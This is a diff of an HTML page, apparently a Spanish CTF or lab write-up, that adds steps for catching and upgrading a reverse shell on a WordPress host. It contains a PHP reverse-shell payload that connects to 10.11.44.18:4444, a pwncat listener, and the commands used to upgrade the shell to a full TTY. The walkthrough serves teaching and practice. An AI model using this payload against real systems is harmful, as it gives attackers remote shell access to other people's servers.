@@ -248,9 +248,26 @@ Al tener accesso a todos los plugins podemos intentar spawnear una <code class="
 <code><span class="az"> >?php $sock=fsockopen("10.11.44.18",4444); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Antes de activar el plugin tendremos que poner el puerto indicado en el script en <code class="language-plaintext highlighter-rouge">modo escucha</code> para ello usaremos la herramienta <code class="language-plaintext highlighter-rouge">pwncat</code> de la siguiente forma: </p>
+<p class="plain-text">Antes de activar el plugin tenemos que poner el puerto indicado en el script en <code class="language-plaintext highlighter-rouge">modo escucha</code> para ello usaremos la herramienta <code class="language-plaintext highlighter-rouge">pwncat</code> de la siguiente forma: </p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">> pwncat</span> <span class="az">--listen</span> 4444
+</code></pre></div></div><br>
+<p class="plain-text">Una vez preparados activamos el plugin y habremos conseguido spawnear la reverse shell.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">> pwncat</span> <span class="az">--listen</span> 4444
+/bin/sh: 0: can't access tty; job control turned off
+$whoami
+daemon
+$
+</code></pre></div></div><br>
+
+<p class="plain-text">Hemos obtenido la reverse shell pero es una shell no interactiva, para poder trabajar en ella
+de manera más cómoda y eficiente vamos a proceder a upgradearla con los siguientes comandos:<br>
+python -c 'import pty; pty.spawn("/bin/bash")'<br>
+export TERM=screen-256color</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+$python -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ export TERM=screen-256color
 </code></pre></div></div><br>
 
 
